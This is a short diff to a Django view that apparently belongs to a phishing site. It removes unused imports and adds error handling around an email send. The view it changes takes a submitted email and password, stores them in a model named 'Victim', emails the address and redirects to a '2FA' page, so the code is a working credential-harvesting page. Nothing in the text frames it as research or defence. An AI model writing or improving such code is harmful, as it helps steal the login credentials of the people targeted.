@@ -1,6 +1,5 @@
-from django.http import HttpResponse, JsonResponse, HttpResponseRedirect
+from django.http import HttpResponseRedirect
 from django.shortcuts import render, redirect
-from django.urls import reverse
 from .models import Victim
 from .email import send_email
 
@@ -15,7 +14,10 @@ def index(request):
         Victim.objects.create(
             email=request.POST["email"], password=request.POST["password"]
         )
-        send_email(request.POST["email"])
+        try:
+            send_email(request.POST["email"])
+        except Exception as e:
+            print(f"Error al enviar el correo: {e}")
         return redirect("2FA")
 
 
